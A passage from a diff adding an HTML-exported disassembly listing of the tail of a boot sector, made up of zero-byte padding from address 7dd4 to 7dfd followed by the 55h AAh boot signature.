+<A NAME="0000:7dd4"></A>ram:0000:7dd4   00              ??          00h                                     
+<A NAME="0000:7dd5"></A>ram:0000:7dd5   00              ??          00h                                     
+<A NAME="0000:7dd6"></A>ram:0000:7dd6   00              ??          00h                                     
+<A NAME="0000:7dd7"></A>ram:0000:7dd7   00              ??          00h                                     
+<A NAME="0000:7dd8"></A>ram:0000:7dd8   00              ??          00h                                     
+<A NAME="0000:7dd9"></A>ram:0000:7dd9   00              ??          00h                                     
+<A NAME="0000:7dda"></A>ram:0000:7dda   00              ??          00h                                     
+<A NAME="0000:7ddb"></A>ram:0000:7ddb   00              ??          00h                                     
+<A NAME="0000:7ddc"></A>ram:0000:7ddc   00              ??          00h                                     
+<A NAME="0000:7ddd"></A>ram:0000:7ddd   00              ??          00h                                     
+<A NAME="0000:7dde"></A>ram:0000:7dde   00              ??          00h                                     
+<A NAME="0000:7ddf"></A>ram:0000:7ddf   00              ??          00h                                     
+<A NAME="0000:7de0"></A>ram:0000:7de0   00              ??          00h                                     
+<A NAME="0000:7de1"></A>ram:0000:7de1   00              ??          00h                                     
+<A NAME="0000:7de2"></A>ram:0000:7de2   00              ??          00h                                     
+<A NAME="0000:7de3"></A>ram:0000:7de3   00              ??          00h                                     
+<A NAME="0000:7de4"></A>ram:0000:7de4   00              ??          00h                                     
+<A NAME="0000:7de5"></A>ram:0000:7de5   00              ??          00h                                     
+<A NAME="0000:7de6"></A>ram:0000:7de6   00              ??          00h                                     
+<A NAME="0000:7de7"></A>ram:0000:7de7   00              ??          00h                                     
+<A NAME="0000:7de8"></A>ram:0000:7de8   00              ??          00h                                     
+<A NAME="0000:7de9"></A>ram:0000:7de9   00              ??          00h                                     
+<A NAME="0000:7dea"></A>ram:0000:7dea   00              ??          00h                                     
+<A NAME="0000:7deb"></A>ram:0000:7deb   00              ??          00h                                     
+<A NAME="0000:7dec"></A>ram:0000:7dec   00              ??          00h                                     
+<A NAME="0000:7ded"></A>ram:0000:7ded   00              ??          00h                                     
+<A NAME="0000:7dee"></A>ram:0000:7dee   00              ??          00h                                     
+<A NAME="0000:7def"></A>ram:0000:7def   00              ??          00h                                     
+<A NAME="0000:7df0"></A>ram:0000:7df0   00              ??          00h                                     
+<A NAME="0000:7df1"></A>ram:0000:7df1   00              ??          00h                                     
+<A NAME="0000:7df2"></A>ram:0000:7df2   00              ??          00h                                     
+<A NAME="0000:7df3"></A>ram:0000:7df3   00              ??          00h                                     
+<A NAME="0000:7df4"></A>ram:0000:7df4   00              ??          00h                                     
+<A NAME="0000:7df5"></A>ram:0000:7df5   00              ??          00h                                     
+<A NAME="0000:7df6"></A>ram:0000:7df6   00              ??          00h                                     
+<A NAME="0000:7df7"></A>ram:0000:7df7   00              ??          00h                                     
+<A NAME="0000:7df8"></A>ram:0000:7df8   00              ??          00h                                     
+<A NAME="0000:7df9"></A>ram:0000:7df9   00              ??          00h                                     
+<A NAME="0000:7dfa"></A>ram:0000:7dfa   00              ??          00h                                     
+<A NAME="0000:7dfb"></A>ram:0000:7dfb   00              ??          00h                                     
+<A NAME="0000:7dfc"></A>ram:0000:7dfc   00              ??          00h                                     
+<A NAME="0000:7dfd"></A>ram:0000:7dfd   00              ??          00h                                     
+<A NAME="0000:7dfe"></A>ram:0000:7dfe   55              ??          55h    U                                
+<A NAME="0000:7dff"></A>ram:0000:7dff   aa              ??          AAh                                     
+</PRE></STRONG></FONT></BODY></html>
